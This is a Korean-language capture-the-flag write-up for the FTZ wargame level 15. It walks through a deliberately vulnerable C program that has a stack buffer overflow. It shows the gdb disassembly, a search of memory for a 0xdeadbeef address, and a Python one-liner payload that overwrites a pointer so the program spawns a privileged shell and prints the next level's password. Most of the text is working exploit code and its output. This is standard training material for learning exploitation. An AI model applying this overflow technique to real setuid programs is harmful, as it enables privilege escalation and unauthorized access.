# **FTZ LEVEL15**

## <img src="http://freevector.co/wp-content/uploads/2014/07/61901-door-key.png" width="25"> **Keys**
>attackme.c
```c
#include <stdio.h>
 
main()
{ int crap;
  int *check;
  char buf[20];
  fgets(buf,45,stdin);
  if (*check==0xdeadbeef)
   {
     setreuid(3096,3096);
     system("/bin/sh");
   }
}
```
FTZ 14번 문제와 비슷하지만 포인터로 `deadbeef` 를 검사하고 있다.

gdb로 분석하면
```
(gdb) disas main
Dump of assembler code for function main:
0x08048490 <main+0>:	push   ebp
0x08048491 <main+1>:	mov    ebp,esp
0x08048493 <main+3>:	sub    esp,0x38
0x08048496 <main+6>:	sub    esp,0x4
0x08048499 <main+9>:	push   ds:0x8049664
0x0804849f <main+15>:	push   0x2d
0x080484a1 <main+17>:	lea    eax,[ebp-56]
0x080484a4 <main+20>:	push   eax
0x080484a5 <main+21>:	call   0x8048360 <fgets>
0x080484aa <main+26>:	add    esp,0x10
0x080484ad <main+29>:	mov    eax,DWORD PTR [ebp-16]
0x080484b0 <main+32>:	cmp    DWORD PTR [eax],0xdeadbeef
0x080484b6 <main+38>:	jne    0x80484dd <main+77>
0x080484b8 <main+40>:	sub    esp,0x8
0x080484bb <main+43>:	push   0xc18
0x080484c0 <main+48>:	push   0xc18
0x080484c5 <main+53>:	call   0x8048380 <setreuid>
0x080484ca <main+58>:	add    esp,0x10
0x080484cd <main+61>:	sub    esp,0xc
0x080484d0 <main+64>:	push   0x8048548
0x080484d5 <main+69>:	call   0x8048340 <system>
0x080484da <main+74>:	add    esp,0x10
0x080484dd <main+77>:	leave  
0x080484de <main+78>:	ret    
0x080484df <main+79>:	nop    
End of assembler dump.
```
`main+32` 에서 주소 자체를 비교하므로 stack 안에 있는 `deadbeef` 를 `ebp-16`이 가리키도록 주소를 입력하겠다.

stack 내에 있는 `deadbeef` 를 `main+32` 에서 찾아보면
```
(gdb) x/16x 0x080484b0
0x80484b0 <main+32>:	0xbeef3881	0x2575dead	0x6808ec83	0x00000c18
0x80484c0 <main+48>:	0x000c1868	0xfeb6e800	0xc483ffff	0x0cec8310
0x80484d0 <main+64>:	0x04854868	0xfe66e808	0xc483ffff	0x90c3c910
(gdb) x/16x 0x080484b2
0x80484b2 <main+34>:	0xdeadbeef	0xec832575	0x0c186808	0x18680000
0x80484c2 <main+50>:	0xe800000c	0xfffffeb6	0x8310c483	0x48680cec
0x80484d2 <main+66>:	0xe8080485	0xfffffe66	0xc910c483	0x895590c3
```
`deadbeef` 의 주소가 `0x080484b2` 라는 것을 알았다. 
## <img src="https://pngimg.com/uploads/road/road_PNG24.png" width="25"> **Payload**
>메모리 구조
```
| buf[20] | dummy[20] | &(deadbeef) | dummy[12] | sfp | ret |
```

>Payload
```
 (python -c "print 'A'*40+'\xb2\x84\x04\x08'";cat) | ./attackme
```

## <img src="https://maxcdn.icons8.com/windows8/PNG/512/Military/sword-512.png" width="25"> **Attack**
```
[level15@ftz level15]$ (python -c "print 'A'*40+'\xb2\x84\x04\x08'";cat) | ./attackme 
my-pass

Level16 Password is "~~~~~~~~~".
```